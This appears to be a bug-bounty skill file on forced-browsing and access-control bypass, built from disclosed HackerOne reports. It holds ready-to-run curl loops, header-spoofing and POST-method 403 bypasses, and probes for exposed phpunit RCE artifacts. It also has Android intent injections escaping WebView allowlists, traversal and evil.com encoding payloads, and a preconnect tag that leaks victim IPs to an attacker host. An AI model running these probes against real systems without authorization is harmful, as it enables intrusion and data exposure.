---
name: hunt-forced-browsing
description: Hunting skill for FORCED BROWSING / direct-request and authorization-by-obscurity bypass — reaching "hidden" resources by requesting their URLs directly, defeating UI-only access controls, 403/404 gates, path-prefix allowlists, scheme validation, IP restrictions, and the assumption that nobody will guess a sensitive path. Built from 12 full disclosed reports: Acronis nginx_status/ 403 bypass via X-Forwarded-For ($250), Shopify mobile deep-link/URL-scheme validation bypass into WebView JavaScript + EASDK bridge, X (xAI) Safari 0-click IP exfiltration via preconnect, HackerOne pre-release challenge scope_versions disclosure, US DoD 403 bypass via POST + Content-Length:0, Zomato/Eternal vendor/ and Stellar wp-content/uploads direct file access, Ubiquiti forbidden-directory 200 responses, Tor bridge-force via custom scheme, curl URL-API null-byte/redirect pointer bug, and a maximum.nl subdomain redirect misconfiguration. Use when hunting any endpoint, file, directory, or pre-release resource the UI hides but the server still serves to a direct request.
sources: hackerone_public
report_count: 13
full_reports_read: 12
---

## Crown Jewel Targets

Forced browsing wins when a resource **exists and is served**, but the application pretends it does not — access is "controlled" only by not linking to it, by a 403 page, by a path-prefix check, or by a scheme allowlist. The crown jewels are resources whose mere retrieval is the win.

- **Operational / status endpoints** — `/nginx_status`, `/server-status`, `/actuator`, `/metrics`, `/phpinfo.php`, `/_profiler`, `/debug`, `/health`. These are typically IP-restricted and reveal internal topology, hostnames, and config. Acronis `nginx_status/` returned 403 until a spoofed `X-Forwarded-For: 127.0.0.1:80` turned it into 200 with content.
- **Hidden/pre-release application state** — a challenge's `scope_versions` page before launch, draft/staging content, hidden route names, "coming soon" pages. HackerOne's challenge scope was readable before the challenge began simply by hitting the route.
- **Framework artifact directories** — `/vendor/`, `/node_modules/`, `/logs/`, `/.git/`, `/backup/`, `/storage/`. Zomato exposed `/vendor/composer/installed.json`, `slim/composer.json`, `/vendor/bin/phpunit`, and even `eval-stdin.php`. The dependency manifest alone fingerprints exploitable versions.
- **Upload and static directories** — `wp-content/uploads/`, `/media/`, `/files/`, `/documents/`, `/static/cm/mode/`. Stellar's governing PDFs (Bylaws, filed foundation docs) were directly accessible with no authentication. Ubiquiti returned 200 for `/static/cm/mode/xml/` and `/static/cm/mode/django/` nested inside a 403 directory.
- **Admin/internal paths merely "not linked"** — `/admin`, `/administrator`, `/manage`, `/internal`, `/console`, and path-prefix-protected deep links. Shopify's WebView deep-link handler only checked a `/admin/...` prefix; appending `../` escaped to arbitrary URLs.
- **Mobile custom-scheme entry points** — exported activities handling `scheme://` intents (Shopify's `NavigationActivity`, Tor Orbot's `bridge://`). An unvalidated scheme or path loads arbitrary HTML/JS or mutates app settings.
- **Subdomains with dangling/incorrect redirects** — `corne.maximum.nl` pointed at an external domain under different control, a classic forced-browsing-adjacent takeover/redirect misconfiguration.
- **Resources behind method-based or header-based gates** — 403 pages that flip to 200 on POST with `Content-Length: 0`, or on a spoofed proxy header.

Severity escalates with: secrets/PII in the file, admin functionality reachable, pre-release/confidential data, or a chain into RCE (an exposed `phpunit`/`eval-stdin.php`, a WebView JS bridge, a forced bridge list). "The directory exists" alone is low; "the directory contains IAM keys, contracts, or an RCE surface" is high.

### Value Ranking (what to attack first)

| Tier | Target class | Why it pays | Representative report |
|---|---|---|---|
| S | Exposed RCE artifact (`phpunit`/`eval-stdin.php`, `vendor/` with known vuln) | Direct code execution on the server | #271391 |
| S | WebView JS bridge via scheme/deep-link bypass | Arbitrary JS + native bridge in a trusted app context | #1737358, #1087744 |
| A | Hidden admin/internal path reachable unauthenticated | Unauthorized privileged actions/data | #991717, #565736 |
| A | Status/metrics endpoint behind spoofable gate | Internal topology, hostnames, credentials in env | #1224089 |
| B | Sensitive documents in upload/static dirs | PII, contracts, regulated data | #263780 |
| B | Pre-release / hidden application state | Confidentiality breach, informational advantage | #565736 |
| B | Forced network side effect (preconnect/scheme) | Victim IP/session deanonymization, forced settings | #1392211, #252626 |
| C | Wrong-redirect subdomain / dangling host | Takeover foothold, phishing, session capture | #643446 |

### The Core Question for Every Candidate

Forced browsing is not "I found a URL." It is "I found a URL the owner believes is unreachable, and I can prove it is reachable." Ask, in order:

1. **Does a gate exist at all?** A 403, a redirect to login, a hidden-from-UI route, a path prefix, a scheme allowlist, an IP check. If there is no gate, the resource is simply public and this is not a finding.
2. **Is the gate the only control?** If yes, the obscurity *is* the vulnerability. Bypass it and demonstrate unauthorized access.
3. **What is behind it?** Rank the exposed resource using the table above. The payload is only as good as what it unlocks.
4. **Was access intended to be denied?** Confirm with the program policy / documentation (e.g., HackerOne's policy explicitly said the challenge scope "will be displayed at a later date").

---

## Attack Surface Signals

### URL / Path Patterns to Hunt
```
/nginx_status
/server-status
/status
/actuator
/actuator/env
/metrics
/phpinfo.php
/info.php
/_profiler
/debug
/.env
/.git/HEAD
/vendor/composer/installed.json
/vendor/*/composer.json
/vendor/bin/phpunit
/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/node_modules/
/logs/
/backup/
/wp-content/uploads/
/uploads/
/media/
/files/
/documents/
/static/cm/mode/
/static/cm/mode/xml/
/static/cm/mode/django/
/scope_versions
/admin
/administrator
/manage/
/internal/
/console/
/api/private/
```
Look for **nested reachable paths inside a forbidden parent** (`/static/` = 403 but `/static/cm/mode/` = 200) — a single authorization check applied at the top of a tree but not inherited by children.

### Custom Schemes / Deep Links (mobile & desktop)
```
shopify://
https://*.myshopify.com/admin/collections/../../
bridge://xxx                      # Tor Orbot forced bridge list
intent://
<custom>.navigation.NavigationActivity  # scheme passed as "extra"
```
Check exported activities and declared intent filters: any scheme accepted from an external VIEW intent is a forced-browsing entry point.

### Header / Method Signals
```
X-Forwarded-For: 127.0.0.1:80     # Acronis 403 -> 200
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Host: localhost
X-Custom-IP-Authorization: 127.0.0.1
POST + Content-Length: 0          # DoD 403 bypass
```

### Tech-Stack Signals
- **nginx / PHP / Slim / Symfony / Laravel** — `nginx_status/`, `vendor/` exposure, front-controller misconfiguration.
- **WordPress** — `wp-content/uploads/` with sensitive PDFs/documents.
- **Django / XML-serving stacks** — forbidden `/static/cm/mode/` subtrees left readable.
- **Mobile WebView apps** — EASDK / JS bridge + URL/scheme handler = arbitrary JS execution.
- **Bug-bounty / challenge platforms** — hidden versions/history routes (`scope_versions`).
- **Browsers with link preloading** — `<link rel="preconnect">` forces an outbound TCP connection without a click.

### Interpreting Status Codes as Signals

| Response | What it usually means | Hunting action |
|---|---|---|
| `403` on a guessable path | Resource exists, access denied | Spoof headers, change method, walk child paths |
| `401` + `WWW-Authenticate` | Auth gate possibly misconfigured on siblings | Test unauthenticated sibling/version paths |
| `404` on a path that "should" exist | Handler hides existence, or route is disabled | Try method override, trailing slash, case variants |
| `302` → `/login` for one path but `200` for neighbor | Inherited ACL missing on neighbor | Probe sibling routes systematically |
| `200` inside a `403` parent tree | Classic incomplete authorization | Map the whole subtree |
| `411` on a POST attempt | Server requires `Content-Length` | Add `Content-Length: 0` (DoD pattern) |
| `403` → `200` on header spoof | Trust in proxy headers | Check every other IP-restricted endpoint |

### Where to Source Candidate Paths

- **Content-discovery wordlists** — combine a general web-content list with framework-specific lists (`/vendor/`, `/wp-content/`, `/actuator/`).
- **Dependency manifests** — once `/vendor/composer/installed.json` or `package.json` is readable, derive exact paths from package names.
- **JS bundles and source maps** — grep for route strings, admin paths, and version/history endpoints.
- **Error pages and stack traces** — disclose full filesystem paths and framework versions.
- ** robots.txt / sitemap.xml / .DS_Store** — disallowed entries are an honest advertisement of "hidden" content.
- **Manifest / OpenAPI / GraphQL introspection** — enumerate routes the UI never links to.
- **Challenge/program policy text** — "scope will be displayed at a later date" tells you a hidden route exists (#565736).

### Nested-Path Heuristic (high-yield)

When a denial appears, do not stop at that path. Build a small tree probe:

```
/static/                     -> 403
/static/cm/                  -> 403
/static/cm/mode/             -> 200   <-- ACL gap
/static/cm/mode/xml/         -> 200   <-- deeper gap
/static/cm/mode/django/      -> 200   <-- deeper gap
```
This exact progression was reported against Ubiquiti (#220150). Automate it with a short, shallow wordlist appended to each denied segment.

---

## Discovery Patterns From 12 Full Reports

### Where Researchers Start (ranked recon surfaces w/ "what to look for")

1. **Forbidden responses during passive crawl (highest yield).** Grep every spider result for `403`, `401`, `404`, and `302 -> login`. Ask: *what is behind this?* Acronis began with `nginx_status/` returning 403; the researcher did not need a link — the denial itself advertised an existing resource. DoD's researcher started from a URL that redirected to a 403 page.

2. **Secondary/hidden routes on known platforms.** Enumerate routes implied by the platform's own features: a challenge has a `scope_versions` history; an admin area has sibling paths. HackerOne's finding came from appending `/scope_versions` to a challenge URL while the scope was still "hidden."

3. **Technology fingerprint → artifact guessing.** Identify the stack from headers, cookies, error pages, or an exposed manifest, then request its well-known artifacts. Zomato: "I can see that Slim is used, and various libraries are installed with composer" → `/vendor/composer/installed.json` and `/vendor/bin/phpunit`.

4. **Directory tree walking around a denial.** When a parent path is forbidden, fuzz one and two levels deeper. Ubiquiti: `/static/` and `/static/cm/` were forbidden, but `/static/cm/mode/`, `/static/cm/mode/xml/`, and `/static/cm/mode/django/` returned 200.

5. **Static/upload directory listings.** Walk `wp-content/uploads/<year>/<month>/` and similar. Stellar found governing PDFs by requesting the upload directory path directly, no authentication.

6. **Mobile app attack surface.** Decompile the APK, read `AndroidManifest.xml` for exported activities and intent filters, then look at how scheme/path extras are validated. Shopify (2021) and Shopify (2025) both started from declared schemes/path prefixes in the app, then found the validator could be escaped.

7. **Subdomain/redirect hygiene review.** Enumerate subdomains and follow redirects to their final host. maximum.nl's `corne.` subdomain pointed to a domain controlled by a third party — found by noticing the redirect target.

8. **Client-side preload/link tags.** Inspect HTML for `<link rel="preconnect">` and prefetch hints that leak a connection. X (xAI)'s 0-click finding came from a preconnect tag that fired a TCP connection when a page loaded.

9. **Library/parser edge cases in dependency code.** Read changelogs and diffs for scheme/URL handling. The curl report cited a `lib/urlapi.c` diff where `CURLU_NO_GUESS_SCHEME` was removed so `redirect_url` pointer arithmetic stayed valid — a null-byte/scheme interaction bug.

### Feature-Based Discovery Signals (frequency-ranked table w/ "why it matters / what to probe")

| Rank | Signal (reports) | Why it matters | What to probe |
|---|---|---|---|
| 1 | filter-bypass (5) | A gate exists — it can be tricked into allowing you | Spoof proxy headers, change method, encode paths, null bytes, append `../` |
| 2 | redirect-handling (4) | Redirects hide/relocate access; target host may change | Follow each hop manually; inspect `Location`; test subdomain redirects |
| 3 | subdomain-takeover (2) | A host you don't control may be reachable through an app/scheme | Resolve all subdomains; check final redirect targets; force custom schemes |
| 4 | server-side-rendering (2) | Server/client renders content you can influence | WebView deep links, direct file URLs, preconnect/prefetch side effects |
| 5 | comment-injection (2) | Embedded comments/metadata can carry malicious hints | Inject HTML/JS comments into templates and parser test cases |
| 6 | xml-parser (2) | Parsers fetch or expose paths based on XML/config | DTD/entity references, `/static/.../xml/` directories, SVG |
| 7 | api-endpoint (1) | API path may be callable directly | Enumerate API routes; call without UI preconditions |
| 8 | host-header (1) | Host/X-Forwarded headers drive access decisions | `Host:`, `X-Forwarded-For`, `X-Forwarded-Host` overrides |
| 9 | internal-network (1) | Internal-only resources assumed unreachable | Loopback/`127.0.0.1` spoofing, `X-Forwarded-For: 127.0.0.1:80` |
| 10 | recon (1) | Hidden routes discoverable by URL guessing | Version/history paths, pre-release routes |
| 11 | open-redirect (1) | `Location` can be steered | Response-split/redirect params, trailing `//evil.com` |
| 12 | image-processing (1) | Image fetch/preload leaks connections | Preconnect tags, image proxies, lazy-loading |
| 13 | search-filter-sort (1) | Query params may bypass UI filters | Tweak sort/filter params to reveal hidden records |
| 14 | time-based (1) | Timing differences reveal hidden state | Measure response delay across variants |
| 15 | dos-resource (1) | Resource-heavy forced requests reveal hidden endpoints | Observe side effects of forced loads |
| 16 | sso-oauth (1) | Auth flows expose deep-link handlers | Test VIEW intents into login/redirect activities |
| 17 | admin-internal (1) | Admin paths guarded only by obscurity | Brute common admin paths; test prefix bypasses |
| 18 | path-traversal-lfi (1) | Prefix checks defeated by `../` | Append `../` to allowlisted path prefixes |
| 19 | misconfiguration (1) | Wrong docroot exposes framework dirs | Request `/vendor/`, `/.git/`, `/logs/` |
| 20 | null-byte (1) | C/URL-API null handling breaks comparisons | `%00` in scheme/host/redirect fields |
| 21 | auth-bypass (1) | Auth decision bypassable at parser level | Null byte + scheme confusion in URL parsers |
| 22 | subdomain (1) | Single wrong DNS/redirect record | Compare subdomain target to expected domain |

### Verbatim Discovery Clues

Real "how I found it" lines from the disclosed reports (verbatim, `[#id]` tagged):

- [#1224089] "So, I have found a 403 bypass on nginx_status/, this endpoint doesn't give that much info but it had 403, so I was able to bypass to see 200 and see the content."
- [#1224089] "First try to access https://branded-us4-cloud.acronis.com/nginx_status/, you'll see 403"
- [#1224089] "Now add a header, X-Forwarded-For: 127.0.0.1:80, you'll see 200 response code and you'll see the content"
- [#263780] "I was able to access the following PDF files without any authentication"
- [#263780] "the pdf files under path https://www.stellar.org/wp-content/uploads/2014/07/ are directly accessible"
- [#643446] "I noticed that your subdomain corne.maximum.nl links to the website \"maximum.com\" instead of \"maximum.nl\" (\"maximum.com\" is in control of a Chinese organization as you said in your description)."
- [#565736] "I have come across an issue where I am able to view a HackerOne challenge scope before the challenge begins."
- [#565736] "You can see this by going to the challenge's `scope_versions` page before the challenge starts and the scope is still hidden"
- [#991717] "I managed to bypass 403 forbidden pages in www.████████.mil"
- [#991717] "How you did bypass? Answer:With POST method and Content-Length header.If you send GET or dont use that header you cant bypass."
- [#1392211] "When the user loads the page and doesn't click on any content Safari preloads the ad target domain (in this case ██████████). Using that, without the user tapping on the link, my server receives a TCP connection where I extract the IP and hostname of the victim."
- [#1087744] "It was identified that it is possible to bypass the path prefix restrictions by adding appending a \"../\" to the end of the URI. This results on loading arbitrary urls in the application's Webview"
- [#271391] "Typically, in MVC frameworks like Slim (which I see you are using here), Symfony, Laravel, etc., the front controller is the only thing exposed, leaving `vendor/`, `logs/`, and others outside of document root, inaccessible to web browsers. However, it appears that here that's not the case, having `vendor/` accessible."
- [#271391] "Recently, `phpunit` had an RCE vulnerability, that if exposed, would allow users to run arbitrary PHP code. PHPUnit is indeed installed"
- [#220150] "My investigations revealed that we have accesible directory in forbidden directory:"
- [#220150] "http://www.ubnt.com/static/cm/mode/ - 200 http code (accesible)"
- [#252626] "And new list of bridges will be applied (notification will be shown and new value will be added to shared_prefs)."
- [#1737358] "It was found that the com.shopify.mobile app doesn't validate the scheme of the url given as an extra parameter to the com.shopify.mobile.navigation.NavigationActivity which may allow the loading of arbitrary html content (including js code) in the application's webview"

### Probe Checklist (15 concrete probes)

1. Request every 403/401 URL with `X-Forwarded-For: 127.0.0.1:80` and compare the status (Acronis pattern).
2. Re-issue each forbidden GET as `POST` with `Content-Length: 0` (DoD pattern; watch for 411).
3. Walk one/two levels deeper into any forbidden directory (`/static/cm/mode/`).
4. Request framework artifacts directly: `/vendor/composer/installed.json`, `/.git/HEAD`, `/.env`.
5. List known upload paths by year/month (`/wp-content/uploads/2014/07/`) and fetch any document found.
6. Append `/scope_versions`, `/history`, `/versions`, `/raw`, `/draft` to known object URLs.
7. For path-prefix-protected routes, append `../` (and `..;/`, `%2e%2e/`) to escape the allowlist.
8. Test the same path with `X-Original-URL` / `X-Rewrite-URL` set to an admin path.
9. For each exported mobile activity, send a VIEW intent with an arbitrary scheme and an arbitrary URL extra.
10. For deep links with a path allowlist, append `/../../` and observe whether an external URL loads.
11. Resolve every subdomain and record final redirect targets; flag hosts outside the organization.
12. Inspect page HTML for `<link rel="preconnect">`/`prefetch` pointing at attacker-controllable hosts.
13. Fuzz 404 endpoints for "exists but hidden" via method override (`X-HTTP-Method-Override`) and null-byte suffixes (`%00`, `;`).
14. Probe URL parsers with scheme confusion and `%00` in host/redirect fields (curl pattern).
15. Compare authenticated vs unauthenticated responses for every discovered path — record which are served with no session.

### Sequencing the Probes (fastest path to a hit)

- **Batch the cheap checks first.** Run header spoofing and method overrides across the full denial list before hand-crafting deep-link intents — header/method flips are the highest-frequency signal in the corpus (filter-bypass appeared in 5 of 12 reports).
- **Then go deep.** For each remaining denial, walk child segments one and two levels. This is what turned Ubiquiti's "forbidden" tree into three accessible directories.
- **Then go sideways.** Append version/history/draft suffixes and try hidden routes on the same host.
- **Then go to the client.** Reverse the mobile app only after the web surface is exhausted, unless the target is explicitly a mobile program.
- **Finally, check the network side effects.** Preconnect/prefetch and forced schemes are subtle; verify them with a listener rather than a status code.

### What a Negative Result Tells You

A probe that does **not** flip the gate is still evidence. Record it:

- If no header or method changes the 403, the gate is likely a real authorization check — move on rather than burning time.
- If only *one* header flips it, that header is the root cause and belongs in the report so the client can fix the right control.
- If a path is 404 under every variant, it is probably not deployed; do not claim forced browsing on a non-existent resource.
- If an unauthenticated request returns the same 200 as an authenticated one, the "hidden" resource was never protected — confirm with the program whether it is in scope as information disclosure.

### Corpus-Derived Observed Outcomes

| Report | Initial observation | Winning probe | Result |
|---|---|---|---|
| #1224089 | `nginx_status/` = 403 | `X-Forwarded-For: 127.0.0.1:80` | 200 + content |
| #991717 | forbidden page → 403 | POST + `Content-Length: 0` | bypass |
| #220150 | `/static/` = 403 | walk children | `/static/cm/mode/` = 200 |
| #565736 | scope "hidden until later" | append `/scope_versions` | scope disclosed |
| #271391 | Slim fingerprinted | request `/vendor/composer/installed.json` | dependency manifest + PHPUnit exposed |
| #263780 | PDFs unlinked | fetch `/wp-content/uploads/...` directly | documents disclosed |
| #1087744 | `/admin/...` prefix allowlist | append `../` | arbitrary WebView URL |
| #643446 | subdomain exists | follow redirect to final host | third-party-controlled target |

---

## Step-by-Step Hunting Methodology

1. **Crawl and catalog every denial.** Spider the target authenticated and unauthenticated. Save all 403/401/404/redirect-to-login URLs into a list — denials are the map of hidden resources.

2. **Fingerprint the stack.** From headers, cookies, error pages, and JS, note the framework (Slim, Symfony, Laravel, WordPress, Django, nginx) and prioritize its known artifacts.

3. **Test the gate, not just the path.** For each denial, cycle through bypass primitives in this order: spoofed proxy headers → method change with `Content-Length: 0` → `X-Original-URL`/`X-Rewrite-URL` → path encoding/traversal → null byte. Record which primitive flips the status.

4. **Walk the tree around every denial.** Fuzz child segments one and two levels deep. A 403 parent with a 200 child is a repeatable class of finding.

5. **Enumerate hidden state routes.** Append version/history/draft suffixes to known object URLs (challenge scope, invoices, reports, documents) and check pre-release access.

6. **Harvest static content.** Crawl upload/media/document directories; fingerprint file types; retrieve PDFs, contracts, backups, and config files without a session.

7. **Reverse the mobile app.** Extract the manifest for exported activities and scheme handlers. Test scheme validation and path-prefix validation specifically — that is where Shopify's bugs lived.

8. **Verify the resource is genuinely hidden, not merely unlinked.** Check whether an ordinary user could reach it through UI flow. If the UI never exposes it but the server serves it to a direct request, it is forced browsing.

9. **Determine the true impact.** Is it information disclosure, admin access, a JS bridge, or an RCE-ready artifact? Fetch file contents and quantify the blast radius.

10. **Check for a chain.** Exposed `phpunit`/`eval-stdin.php` → RCE; deep-link → WebView JS + EASDK bridge → account actions; forced bridge list → traffic interception; preconnect → victim IP deanonymization.

11. **Document reproduction from a cold start** — exact URL, headers/method, and response body. Confirm the behavior is deterministic and not a transient cache.

12. **Submit with a clean minimal PoC** showing the direct request and the unauthorized response side by side.

### Decision Tree for a Single Denied URL

```
Is the URL linked anywhere in the authenticated UI?
  NO  -> likely hidden resource; continue
  YES -> is access appropriate for your account?
           YES -> not a finding
           NO  -> IDOR/authz bug, not pure forced browsing -> chain with hunt-idor

Does a 403 / login redirect / path-prefix / scheme check guard it?
  NO  -> resource is probably public; confirm with program policy
  YES -> the gate is the target

Try, in order:
  1. proxy-header spoof         -> 200?  = header-trust root cause
  2. POST + Content-Length: 0   -> 200?  = method-only ACL
  3. X-Original-URL / Rewrite   -> 200?  = edge/origin path confusion
  4. child-path walk            -> 200?  = incomplete parent ACL
  5. version/history suffix     -> 200?  = hidden-state exposure
  6. ../ prefix escape / scheme -> loads? = client-side validation bug
  7. preconnect / forced scheme -> inbound? = network side-effect bug

Did anything flip, load, or connect?
  NO  -> record negative, move to next candidate
  YES -> capture content/capability -> quantify impact -> Gate 0 -> report
```

### Tooling Notes

- **Proxy tool** — keep a dedicated Repeater tab per candidate with the full request/response pair; status flips are easy to lose in history.
- **Content discovery** — run a wordlist in passive mode first to avoid WAF blocks, then targeted manual requests for the bypass primitives.
- **Listener** — for preconnect/scheme findings, run a TCP/HTTP listener you control and timestamp connections so you can tie them to the triggering page load.
- **Mobile** — `apktool`/`aapt` for manifest extraction; `am start` for intent injection; a WebView debugging session to observe loaded URLs.
- **Differencing** — always compare a baseline (unmodified request) to the modified one; the delta *is* the finding.

### Common Mistakes to Avoid

- Reporting a public file as "direct access" — check whether an ordinary visitor is supposed to see it.
- Stopping at the status code — retrieve and show the actual content.
- Guessing only top-level paths — the corpus's wins repeatedly came from **deeper** paths.
- Ignoring the negative controls — knowing which header did *not* work sharpens root-cause analysis.
- Claiming a custom-scheme finding without demonstrating the actual JS/settings impact.

---

## Payload & Detection Patterns

### 403 / Access-Control Bypass Probes
```bash
# Header spoofing (Acronis #1224089)
curl -s -o /dev/null -w "%{http_code}\n" https://TARGET/nginx_status/
curl -s -o /dev/null -w "%{http_code}\n" -H "X-Forwarded-For: 127.0.0.1:80" https://TARGET/nginx_status/

# Method + Content-Length (DoD #991717)
curl -s -H "Content-Length: 0" -X POST https://TARGET/FORBIDDEN_PATH

# Header-based path override
curl -s -H "X-Original-URL: /admin" https://TARGET/
curl -s -H "X-Rewrite-URL: /admin" https://TARGET/

# Loopback variants
for H in 'X-Forwarded-For: 127.0.0.1' 'X-Forwarded-For: localhost' \
         'X-Real-IP: 127.0.0.1' 'X-Custom-IP-Authorization: 127.0.0.1'; do
  curl -s -o /dev/null -w "$H -> %{http_code}\n" -H "$H" https://TARGET/PATH
done
```

### Directory / File Discovery
```bash
# Framework artifacts
for P in /.git/HEAD /.env /vendor/composer/installed.json \
         /vendor/bin/phpunit /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php \
         /composer.json /package.json; do
  curl -s -o /dev/null -w "$P -> %{http_code}\n" https://TARGET$P
done

# Upload directories
curl -s https://TARGET/wp-content/uploads/2014/07/ | grep -oE 'href="[^"]+"'
```

### Hidden-Route Suffix Fuzzing
```bash
ffuf -u 'https://TARGET/CHALLENGE/FUZZ' \
  -w <(printf 'scope_versions\nhistory\nversions\nraw\ndraft\nadmin\nstatus\nbackup\n') \
  -fs 0 -mc 200,301,302,403
```

### Deep-Link / Scheme Payloads
```bash
# Path-prefix escape (Shopify #1087744)
am start -W -a android.intent.action.VIEW \
  -d "https://someone.myshopify.com/admin/collections/../../"

# Arbitrary scheme into WebView (Shopify #1737358, Tor #252626)
am start -a android.intent.action.VIEW -d "bridge://xxx"
am start -n com.shopify.mobile/.navigation.NavigationActivity \
  -a android.intent.action.VIEW -d "<attacker-scheme>://<attacker-url>"
```

### Parser Edge-Case Probes (curl pattern)
```
%00 in host, scheme, and redirect_url fields
scheme omitted / guessed vs explicit (CURLU_NO_GUESS_SCHEME)
redirect_url pointer arithmetic with incomplete base URL
```

### Preconnect / Weak-Exfil Detection
```html
<link href="https://ATTACKER" rel="preconnect">
<link href="//ATTACKER" rel="preconnect">
```
Watch the attacker listener for an inbound TCP connection with no user click.

### Positive-Signal Detection
- A **status flip** from 403/401 → 200 under a modified header/method.
- A **200 in a child of a 403 parent**.
- A **file body** (manifest, PDF, config) returned with no session cookie.
- A **WebView load** of an external URL after an allowed-prefix path is escaped.
- An **unexpected TCP connection** to your host from a preload tag or forced scheme.

### Batch Status-Flip Harness

```bash
#!/bin/bash
# Compare baseline to each bypass variant; print only changes
TARGET="https://example.com/nginx_status/"
BASE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET")
echo "baseline: $BASE"
for VARIANT in \
  '-H X-Forwarded-For:\ 127.0.0.1:80' \
  '-H X-Real-IP:\ 127.0.0.1' \
  '-H X-Original-URL:\ /admin' \
  '-X POST -H Content-Length:\ 0'; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" $VARIANT "$TARGET")
  [ "$CODE" != "$BASE" ] && echo "FLIP [$CODE] <= $VARIANT"
done
```

### Child-Path Walker

```bash
for P in /static /static/cm /static/cm/mode /static/cm/mode/xml \
         /static/cm/mode/django /vendor /vendor/composer \
         /vendor/phpunit/phpunit/src/Util/PHP; do
  printf '%-55s ' "$P"
  curl -s -o /dev/null -w "%{http_code}\n" "https://TARGET$P"
done
```

### Hidden-Route Suffix Matrix

```
<PAGE>/scope_versions      # HackerOne #565736
<PAGE>/history
<PAGE>/versions
<PAGE>/revisions
<PAGE>/raw
<PAGE>/draft
<PAGE>/edit
<PAGE>/admin
<PAGE>/.json
<PAGE>?raw=1
```

### Content-Type / Extension Variants

```
/admin          /admin/         /Admin          /ADMIN
/admin.php      /admin.json     /admin.xml      /admin.bak
/admin~         /admin.old      /admin.orig     /admin.txt
/admin%00       /admin%20       /admin.         /admin/..
```

### Mobile Intent Injection Reference

```bash
# Enumerate exported activities
aapt dump xmltree app.apk AndroidManifest.xml | grep -i -A3 'activity\|intent-filter'

# Invoke a deep link with traversal
am start -a android.intent.action.VIEW \
  -d "https://target.com/allowed/path/../../external"

# Force a custom scheme (Tor bridge pattern)
am start -n org.torproject.android/.OrbotMainActivity \
  -a android.intent.action.VIEW -d "bridge://xxx"
```

### Parser/Encoding Payload Set

```
%00              # null byte at end of path or in scheme
%2500            # double-encoded null
//evil.com       # scheme-relative
https:/\evil.com # backslash confusion
https://target.com@evil.com
https://evil.com#target.com
HTTPS://TARGET   # case variation
```

### Evidence to Capture for Each Positive

- **Full request** (method, path, all headers, body) — not just the URL.
- **Full response** with status, headers, and body showing the unauthorized content.
- **Baseline request/response** showing the gate in its normal state.
- **A screenshot or recording** for WebView/scheme findings showing the external content actually loaded.
- **Listener log** with timestamps for preconnect/scheme network findings.
- **A one-line statement** of what the resource is and why access should have been denied.

---

## Common Root Causes

1. **Security through obscurity** — access "control" is simply not linking to the resource. If a direct request is enough, there is no authorization.

2. **Incomplete parent-path authorization** — a 403 applied to `/static/` but not inherited by `/static/cm/mode/` children (Ubiquiti).

3. **Trust in proxy headers** — nginx/app treats `X-Forwarded-For: 127.0.0.1:80` as proof of loopback origin, exposing `nginx_status/` (Acronis).

4. **Method/header-dependent ACLs** — the gate is written for GET only, so POST with `Content-Length: 0` slips through (DoD).

5. **Wrong document root / deployment misconfiguration** — framework directories left inside the web root (Zomato `vendor/`).

6. **Unauthenticated static hosting** — sensitive documents placed in a public uploads directory (Stellar).

7. **Weak path-prefix validation** — checking that a deep link *starts with* an allowed prefix, without normalizing `../` segments (Shopify 2021).

8. **Missing scheme validation** — an exported activity passes a URL extra straight to the WebView (Shopify 2025).

9. **Pre-release routes not access-controlled** — a versions/history endpoint exists before launch with no gate (HackerOne).

10. **Parser/dependency quirks** — null-byte and scheme-guessing behavior in URL libraries (curl).

11. **DNS/redirect hygiene** — a subdomain pointing to a third-party-controlled host (maximum.nl).

12. **Implicit browser/network side effects** — preconnect/prefetch forcing connections without consent (X/xAI).

### Root Cause → Confirmatory Probe

| Root cause | Confirming observation | Report phrase |
|---|---|---|
| Obscurity-only control | Direct request returns content with no session | "Resource is served with no authentication" |
| Incomplete parent ACL | Child path 200 inside 403 parent | "Authorization not inherited by subdirectories" |
| Proxy-header trust | 403 flips only with `X-Forwarded-For` | "Access decision trusts client-supplied proxy header" |
| Method-only ACL | GET 403 but POST+CL:0 200 | "Authorization enforced for GET only" |
| Wrong docroot | Framework artifacts served from web root | "Deployment exposes framework directories" |
| Public static hosting | Sensitive document fetched with no session | "Sensitive files in unauthenticated upload directory" |
| Weak prefix validation | `../` escapes allowlisted prefix | "Validator does not normalize dot segments" |
| Missing scheme validation | Arbitrary scheme loads in WebView | "Exported activity passes URL to WebView unvalidated" |
| Pre-release route | `/scope_versions` readable before launch | "Pre-release resource not access-controlled" |
| Parser quirk | `%00`/scheme confusion changes behavior | "URL parser null-byte/scheme interaction" |
| DNS/redirect hygiene | Subdomain resolves to third-party host | "Subdomain incorrectly redirected to external domain" |
| Implicit preload | Inbound connection with no click | "Page forces outbound connection without user action" |

### Why These Root Causes Cluster

Notice the recurring theme across all 12 reports: **the security decision is made at a different layer than the resource access.** A header is trusted at the edge while the origin serves the file; a prefix is checked in the activity while the WebView resolves the final URL; a parent path is guarded while children are not; a scope is hidden in the UI while the route remains live. Forced browsing is the art of finding that seam. When you identify one such seam, look for siblings — the same mistake is usually repeated across the application.

---

## Bypass Techniques

### 403 Bypass Primitives
```
X-Forwarded-For: 127.0.0.1 / 127.0.0.1:80 / localhost
X-Real-IP: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Host: localhost
X-Custom-IP-Authorization: 127.0.0.1
POST with Content-Length: 0        (avoid 411)
X-HTTP-Method-Override: POST/HEAD
Trailing slash / dot-segment: /admin/  /admin/.  /admin/..;/
Absolute URL in path: GET http://target/admin HTTP/1.1
```

### Path-Prefix / Traversal Bypass
```
/admin/collections/../           -> escapes to parent
/admin/collections/../../        -> arbitrary URL (Shopify)
/allowed/%2e%2e/secret
/allowed/..;/secret
/allowed/%00/secret
Double encoding: %252e%252e/
```
Always normalize with the same algorithm the origin uses — the validator sees the raw string, the loader resolves it.

### Scheme-Validation Bypass
- Pass an unlisted scheme as the activity extra (Shopify 2025).
- Use a declared scheme but append `../` to defeat the path allowlist (Shopify 2021).
- Force a custom scheme from an external app/browser via VIEW intent (Tor `bridge://`).
- Test scheme-relative URLs (`//evil.com`) and mixed-case schemes.

### Header/Host Confusion
- Combine a benign `Host` with a malicious `X-Forwarded-Host`.
- Append a dot to the host (`target.com.`) to bypass literal host allowlists.
